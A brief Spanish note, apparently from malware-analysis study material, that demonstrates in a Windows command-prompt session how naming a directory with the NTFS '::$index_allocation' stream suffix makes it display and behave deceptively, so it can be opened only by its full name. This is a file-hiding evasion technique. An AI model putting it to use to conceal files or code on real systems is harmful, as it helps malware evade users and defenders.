- Flujos NTFS: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3

Ejemplo
```
C:\malware>md test1
C:\malware>tree
Listado de rutas de carpetas
El número de serie del volumen es FFFFFF65 AC06:D3EE
C:.
├───test1
C:\malware>cd test1
C:\malware\test1>cd ..
C:\malware>md test2.::$index_allocation
C:\malware>tree
Listado de rutas de carpetas
El número de serie del volumen es FFFFFF65 AC06:D3EE
C:.
├───test1
└───test2.
C:\malware>cd test2.
El sistema no puede encontrar la ruta especificada.
C:\malware>cd test2.::$index_allocation
C:\malware\test2.::$index_allocation>cd ..
C:\malware>
```
